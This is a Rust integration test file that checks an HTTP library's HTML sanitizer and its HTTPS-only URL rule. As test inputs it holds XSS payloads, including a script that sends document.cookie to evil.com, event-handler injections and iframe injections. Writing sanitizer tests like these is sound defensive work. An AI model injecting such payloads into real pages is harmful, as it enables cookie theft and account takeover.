// Integration: security hardening tests (sanitization, TLS enforcement).

use hsx_core::http::sanitize::{sanitize_html, sanitize_to_text};
use hsx_core::http::tls::enforce_tls;

// ── Sanitization ─────────────────────────────────────────────────

#[test]
fn xss_script_injection_stripped() {
    let payloads = [
        r#"<script>alert('xss')</script>"#,
        r#"<script type="text/javascript">fetch('https://evil.com/?c='+document.cookie)</script>"#,
        r#"<SCRIPT>alert(1)</SCRIPT>"#,
    ];
    for payload in &payloads {
        let safe = sanitize_html(payload);
        assert!(
            !safe.contains("script") && !safe.contains("SCRIPT"),
            "script tag not stripped from: {payload}"
        );
    }
}

#[test]
fn iframe_injection_stripped() {
    let input = r#"<p>Content</p><iframe src="https://malicious.example.com/evil"></iframe>"#;
    let safe = sanitize_html(input);
    assert!(!safe.contains("iframe"));
    assert!(safe.contains("Content"));
}

#[test]
fn event_handler_injection_stripped() {
    let inputs = [
        r#"<p onclick="steal()">text</p>"#,
        r#"<img src="x" onerror="alert(1)">"#,
        r#"<a href="javascript:void(0)" onmouseover="evil()">link</a>"#,
    ];
    for input in &inputs {
        let safe = sanitize_html(input);
        assert!(
            !safe.contains("onclick")
                && !safe.contains("onerror")
                && !safe.contains("onmouseover"),
            "event handler not stripped from: {input}"
        );
    }
}

#[test]
fn semantic_tags_preserved() {
    let input = r#"<h1>Title</h1><p>Para</p><ul><li>Item</li></ul><code>fn()</code><pre>block</pre>"#;
    let safe = sanitize_html(input);
    assert!(safe.contains("<h1>"));
    assert!(safe.contains("<p>"));
    assert!(safe.contains("<code>"));
    assert!(safe.contains("<pre>"));
}

#[test]
fn sanitize_to_text_pure_plain_text() {
    let inputs = [
        "<h1>Hello</h1>",
        "<p>Para <em>text</em></p>",
        "<table><tr><td>Cell</td></tr></table>",
        "<script>alert(1)</script>text",
    ];
    for input in &inputs {
        let text = sanitize_to_text(input);
        assert!(
            !text.contains('<'),
            "HTML tag leaked into plain text output for: {input}"
        );
    }
}

// ── TLS Enforcement ───────────────────────────────────────────────

#[test]
fn https_always_allowed() {
    let urls = [
        "https://example.com",
        "https://api.github.com/repos",
        "https://search.brave.com/search?q=rust",
    ];
    for url in &urls {
        assert!(
            enforce_tls(url).is_ok(),
            "HTTPS URL should be allowed: {url}"
        );
    }
}

#[test]
fn http_localhost_allowed() {
    let urls = [
        "http://localhost:11434",
        "http://127.0.0.1:8080/api",
        "http://localhost:3000/health",
    ];
    for url in &urls {
        assert!(
            enforce_tls(url).is_ok(),
            "localhost HTTP should be allowed: {url}"
        );
    }
}

#[test]
fn http_remote_rejected() {
    let urls = [
        "http://example.com",
        "http://api.evil.com/steal",
        "http://search-engine.com/results",
    ];
    for url in &urls {
        assert!(
            enforce_tls(url).is_err(),
            "remote HTTP should be rejected: {url}"
        );
    }
}
